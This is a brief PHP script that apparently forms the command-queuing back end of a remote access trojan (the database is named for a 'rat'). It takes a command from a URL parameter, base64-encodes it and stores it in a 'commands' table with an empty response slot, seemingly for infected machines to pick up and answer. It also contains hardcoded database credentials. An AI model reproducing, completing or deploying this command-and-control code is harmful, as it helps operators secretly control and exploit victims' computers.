<?php

mysql_connect("localhost", "nzbkpavw_rat", "pq97r") or die(mysql_error());
mysql_select_db("nzbkpavw_rat") or die(mysql_error());

$command = "";
if (isset($_GET['command'])) $command = base64_encode(str_replace(">>", "", $_GET['command']));

if ($command != "") {
	$id = uniqid();
	mysql_query("INSERT INTO commands (id, command, response) VALUES ('$id', '$command', '')");
}

?>